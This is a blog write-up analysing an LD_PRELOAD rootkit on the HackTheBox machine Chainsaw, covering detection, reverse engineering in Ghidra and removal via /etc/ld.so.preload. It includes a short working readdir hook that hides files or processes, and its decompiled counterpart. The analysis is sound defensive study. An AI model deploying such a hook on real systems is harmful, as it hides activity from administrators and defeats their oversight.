---
title: LD_PRELOAD Rootkit on Chainsaw
url: https://0xdf.gitlab.io/2019/11/26/htb-chainsaw-rootkit.html
date: 2019-11-26T02:00:00+00:00
tags: htb-chainsaw, ctf, hackthebox, rootkit, ldpreload, ida, nm, strace, reverse-engineering, ghidra
---

![](https://0xdfimages.gitlab.io/img/chainsaw-rootkit-cover.png)

There was something a bit weird going on with Chainsaw from HackTheBox. It turns out there’s a LD\_PRELOAD rootkit running to hide the NodeJS processes that serve the smart contracts. Why? I have no idea. But since it’s a really neat concept, I wanted to pull it apart. Big thanks to jkr for helping me get started in this rabbit hole (the good kind), and to h0mbre for his recent blog post about these rootkits.

## Enumeration

There’s a few places where I could notice some weirdness on this box. First, as root, I should be able to run `netstat` and see what processes are associated with each listening port. But for the Solididy listeners on 9810 and 63991, it just shows a dash:

```

root@chainsaw:~/ChainsawClub# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      794/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1093/sshd           
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      1066/vsftpd         
tcp6       0      0 :::22                   :::*                    LISTEN      1093/sshd

```

Another interesting bit is that I don’t see a process for the service on port 63991 when I run `ps`. There is a `ganache-cli` process, which references port 9810:

```

root@chainsaw:~# ps auxww | grep node
adminis+  1466  0.0  0.0   2616   844 ?        S    Nov21   0:00 /bin/sh -c node /usr/local/bin/ganache-cli -h 0.0.0.0 -p 9810

```

So why doesn’t the similar process for 63991 show up?

The case breaks open when I try to run `tcpdump`:

```

root@chainsaw:~/ChainsawClub# tcpdump 
ERROR: ld.so: object '/usr/$LIB/chainsaw.so' from /etc/ld.so.preload cannot be preloaded (failed to map segment from shared object): ignored.
tcpdump: error while loading shared libraries: libcrypto.so.1.1: failed to map segment from shared object

```

## LD\_PRELOAD Rootkits

I recently read a really well written [blog post from h0mbre](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/) that explains what’s going on here. This is an LD\_PRELOAD rootkit. It runs by loading a library that exports certain system calls using LD\_PRELOAD, such that when they are called, it can modify the expected result. To pull this off, all one has to do is put this library on disk, and then reference it in `/etc/ld.so.preload`. On Chainsaw, I see that’s the case:

```

root@chainsaw:~/ChainsawClub# cat /etc/ld.so.preload
/usr/$LIB/chainsaw.so

```

h0mbre’s post walks through this in great detail, but one example would be to hook `readdir()` with the following code:

```

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}

```

First, it gets a reference to the original `readdir()` function using `dlsym`, and saves it as `old_readdir`. Then it calls that function, checking to see if any of the results match `FILENAME`, and if so, it breaks so that filename isn’t sent back. You can hook any functions you want, and put whatever logic you want in to mess with the results.

## chainsaw.so

### Finding the Library

I suspect that the `$LIB` referenced in the `/etc/ld.so.preload` is used to get the right architecture, for x86 vs x64 processes. But it also fails sometimes (for example, `tcpdump`). I’ll use `find` to locate the files on Chainsaw:

```

root@chainsaw:~/ChainsawClub# find / -name chainsaw.so 2>/dev/null
/usr/lib32/chainsaw.so
/usr/lib/x86_64-linux-gnu/chainsaw.so

```

There are two results, and as I suspected, 32-bit and 64-bit versions:

```

root@chainsaw:~/ChainsawClub# file /usr/lib32/chainsaw.so /usr/lib/x86_64-linux-gnu/chainsaw.so
/usr/lib32/chainsaw.so:                ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=8d1843c8f88c435f3fb24c7b684f3c636dd2ebde, not stripped
/usr/lib/x86_64-linux-gnu/chainsaw.so: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=9d2eef8413bd23ff717c076820b06698453c4e84, not stripped

```

I’ll `scp` on back to my local box:

```

root@kali# scp -i ~/id_rsa_chainsaw_bobby bobby@10.10.10.142:/usr/lib/x86_64-linux-gnu/chainsaw.so .
chainsaw.so                                      100%   17KB 527.9KB/s   00:00  

```

### Exports

I can use `nm` to see what functions this library exports. If I run with `--extern-only` (or `-g`), I get a list of functions:

```

root@kali# nm --extern-only chainsaw.so 
                 w __cxa_finalize@@GLIBC_2.2.5
                 U dirfd@@GLIBC_2.2.5
                 U dlerror@@GLIBC_2.2.5
                 U dlsym@@GLIBC_2.2.5
                 U fclose@@GLIBC_2.2.5
                 U fgets@@GLIBC_2.2.5
                 U fopen@@GLIBC_2.2.5
                 U fprintf@@GLIBC_2.2.5
                 w __gmon_start__
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
000000000000150b T readdir
00000000000013d1 T readdir64
                 U readlink@@GLIBC_2.2.5
                 U snprintf@@GLIBC_2.2.5
                 U sscanf@@GLIBC_2.2.5
                 U __stack_chk_fail@@GLIBC_2.4
                 U stderr@@GLIBC_2.2.5
                 U strcmp@@GLIBC_2.2.5
                 U strlen@@GLIBC_2.2.5
                 U strspn@@GLIBC_2.2.5

```

Many of those are actually from LIBC, so I’ll add the flag `--defined-only` to get only functions externally available and defined in this library:

```

root@kali# nm --defined-only --extern-only chainsaw.so 
000000000000150b T readdir
00000000000013d1 T readdir64

```

So this library is offering two functions, `readdir` and `readdir64`. Given those are common LIBC functions, those are the functions hooked by this rootkit.

### Why readdir

I want to take a quick tangent here to understand why `readdir` was being hooked. I noticed the rootkit in `netstat -tnlp` and `ps auxww`. I’ll use `ltrace` to see how those functions use `readdir`.

I’ll start with `ltrace netstat -tnlp`. The output is quite long, but I see what I’m looking for right at the top:

```

root@chainsaw:~/projects/ChainsawClub# ltrace netstat -tnlp                                                                                                                                                  
setlocale(LC_ALL, "")                                         = "en_US.UTF-8"                                                                                                                                
bindtextdomain("net-tools", "/usr/share/locale")              = "/usr/share/locale"                                                                                                                          
textdomain("net-tools")                                       = "net-tools"                                                                                                                                  
getopt_long(2, 0x7ffd9c6a0f68, "A:CFMacdeghilnNoprsStuUvVWw2fx64"..., 0x555b7732c020, 32517) = 116                                                                                                           
getopt_long(2, 0x7ffd9c6a0f68, "A:CFMacdeghilnNoprsStuUvVWw2fx64"..., 0x555b7732c020, 32517) = 110
getopt_long(2, 0x7ffd9c6a0f68, "A:CFMacdeghilnNoprsStuUvVWw2fx64"..., 0x555b7732c020, 32517) = 108
getopt_long(2, 0x7ffd9c6a0f68, "A:CFMacdeghilnNoprsStuUvVWw2fx64"..., 0x555b7732c020, 32517) = 112
getopt_long(2, 0x7ffd9c6a0f68, "A:CFMacdeghilnNoprsStuUvVWw2fx64"..., 0x555b7732c020, 32517) = -1
opendir("/proc")                                              = 0x555b78fb4a40
__errno_location()                                            = 0x7f0527dcd518
readdir64(0x555b78fb4a40)                                     = 0x555b78fb4a70
__ctype_b_loc()                                               = 0x7f0527dcd530
readdir64(0x555b78fb4a40)                                     = 0x555b78fb4a88
__ctype_b_loc()                                               = 0x7f0527dcd530
readdir64(0x555b78fb4a40)                                     = 0x555b78fb4aa0
__ctype_b_loc()                                               = 0x7f0527dcd530
...[snip]...

```

It runs `opendir("/proc")` to get the pointer to that directory stream, and then starts using `readdir()` on that location to get pointers to various files.

Later, I see it making calls around `sshd`:

```

...[snip]...
strlen("ocket:[22976]")                                       = 13            
strncpy(0x7ffd9c6a0350, "22976", 5)                           = 0x7ffd9c6a0350
strtoul(0x7ffd9c6a0350, 0x7ffd9c6a03b8, 0, 0x7ffd9c6a0355)    = 0x59c0
strncpy(0x7ffd9c6a060b, "cmdline", 2036)                      = 0x7ffd9c6a060b
open64("/proc/1093/cmdline", 0, 00)                           = 5
read(5, "/usr/sbin/sshd", 511)                                = 18            
close(5)                                                      = 0             
strrchr("/usr/sbin/sshd", '/')                                = "/sshd"
__snprintf_chk(0x7ffd9c6a03c0, 20, 1, 20)                     = 9             
strtol(0x555b78fb5f6b, 0, 10, 23)                             = 1093
getpidcon(1093, 0x7ffd9c6a03b0, 0, 0x1999999999999999)        = 0             
malloc(88)                                                    = 0x555b78fc78a0
strncpy(0x555b78fc78b0, "1093/sshd", 19)                      = 0x555b78fc78b0
...[snip]...

```

I don’t need to fully understand exactly what’s going on, but I get the gist - part of how it is reading processes is by walkign the `/proc` directory. That means that if a rootkit can hook `readdir` and modify the results, it will be able to hide things from other processes like `netstat` and `ps`.

### Reversing chainsaw.so

I’ll open `chainsaw.so` in Ghidra and take a look. In the Symbol Tree window, in the Exports folder, I see `readdir` and `readdir64`:

![image-20191122064352378](https://0xdfimages.gitlab.io/img/image-20191122064352378.png)

I’ll click on `readdir64` and take a look. The Decompile window gives rough C:

```

dirent64 * readdir64(DIR *__dirp)

{
  int iVar1;
  undefined8 uVar2;
  dirent64 *pdVar3;
  long in_FS_OFFSET;
  char local_218 [256];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((original_readdir64 == (code *)0x0) &&
     (original_readdir64 = (code *)dlsym(0xffffffffffffffff,"readdir"),
     original_readdir64 == (code *)0x0)) {
    uVar2 = dlerror();
    fprintf(stderr,"Error in dlsym: %s\n",uVar2);
  }
  while (((pdVar3 = (dirent64 *)(*original_readdir64)(__dirp), pdVar3 != (dirent64 *)0x0 &&
          (uVar2 = get_dir_name(__dirp,local_218,0x100), (int)uVar2 != 0)) &&
         (iVar1 = strcmp(local_218,"/proc"), iVar1 == 0))) {
    uVar2 = get_process_name(pdVar3->d_name,local_118);
    if (((int)uVar2 == 0) || (iVar1 = strcmp(local_118,process_to_filter), iVar1 != 0)) break;
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return pdVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

This code looks very much like the example I cited from h0mbre earlier. After the variables are declared, there’s a block that is getting the libc `readdir64` and saving that as `original_readaddr64`.

Then there’s a while loop, and in that loop I see the check:

```

if (((int)uVar2 == 0) || (iVar1 = strcmp(local_118,process_to_filter), iVar1 != 0)) break;

```

If `local_118`, which is the current process name, matches `process_to_filter`, it breaks and doesn’t return.

By double clicking on `process_to_filter`, the Listing window jumps to what that’s a pointer to:

![image-20191122064815544](https://0xdfimages.gitlab.io/img/image-20191122064815544.png)

Double clicking on `DAT00102000` loads the address 1020000, which shows the string:

![image-20191122064913283](https://0xdfimages.gitlab.io/img/image-20191122064913283.png)

If I right click on the first `6e`, I can change this into a string representation:

![image-20191122065008372](https://0xdfimages.gitlab.io/img/image-20191122065008372.png)

Now it shows it as a string:

![image-20191122065028410](https://0xdfimages.gitlab.io/img/image-20191122065028410.png)

The function for `readdir` is exactlty the same as `readdir64`, just with a different original function.

## Fixing It

One thing about LD\_PRELOAD rootkits is that they are invoked each time a new process is kicked off. So if I get rid of `/etc/ld.so.preload`, the rootkit is gone. For example, I’ll start with the modified `netstat`:

```

root@chainsaw:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      794/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1093/sshd           
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      1066/vsftpd         
tcp6       0      0 :::22                   :::*                    LISTEN      1093/sshd           

```

Now I’ll remove (or just move to `/tmp`) the `ld.so.preload` file, and run it again:

```

root@chainsaw:~# mv /etc/ld.so.preload /tmp/
root@chainsaw:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      1467/node           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      794/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1093/sshd           
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      1151/node           
tcp6       0      0 :::21                   :::*                    LISTEN      1066/vsftpd         
tcp6       0      0 :::22                   :::*                    LISTEN      1093/sshd  

```

Similarly, the processes now show up in the process list:

```

root@chainsaw:~# ps auxww | grep node
root      1151  0.0  5.3 1024748 108408 ?      Sl   Nov21   0:12 node /usr/local/bin/ganache-cli -h 127.0.0.1 -p 63991
adminis+  1466  0.0  0.0   2616   844 ?        S    Nov21   0:00 /bin/sh -c node /usr/local/bin/ganache-cli -h 0.0.0.0 -p 9810
adminis+  1467  0.4  4.3 1027336 89720 ?       Sl   Nov21   6:16 node /usr/local/bin/ganache-cli -h 0.0.0.0 -p 9810

```